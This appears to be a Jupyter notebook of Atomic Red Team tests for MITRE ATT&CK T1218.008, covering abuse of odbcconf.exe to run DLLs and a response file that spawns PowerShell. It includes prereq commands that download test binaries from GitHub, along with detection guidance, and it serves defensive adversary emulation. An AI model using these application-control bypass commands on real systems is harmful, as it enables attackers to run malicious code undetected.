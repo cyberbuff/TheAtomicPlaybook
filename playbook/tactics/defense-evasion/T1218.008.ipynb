{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2c11fc4b",
   "metadata": {},
   "source": "# T1218.008 - Odbcconf\nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) \n"
  },
  {
   "cell_type": "markdown",
   "id": "02d494d9",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "65d3af80",
   "metadata": {},
   "source": "### Atomic Test #1 - Odbcconf.exe - Execute Arbitrary DLL\nExecute arbitrary DLL file stored locally.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1218-2.dll must exist on disk at specified location (#{dll_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll\" -OutFile \"PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd203902",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.008 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "637f97bf",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nodbcconf.exe /S /A {REGSVR \"PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll\"}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5401edd9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.008 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "aedd1904",
   "metadata": {},
   "source": "### Atomic Test #2 - Odbcconf.exe - Load Response File\nExecute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.008\\bin\\T1218.008.rsp) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp\" -OutFile \"PathToAtomicsFolder\\T1218.008\\bin\\T1218.008.rsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll\" -OutFile \"PathToAtomicsFolder\\T1218.008\\bin\\\\o.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5fda160",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.008 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "973bdf1c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncd PathToAtomicsFolder\\T1218.008\\bin\\\nodbcconf.exe -f T1218.008.rsp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6bc04ac",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.008 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "1d40d2ba",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}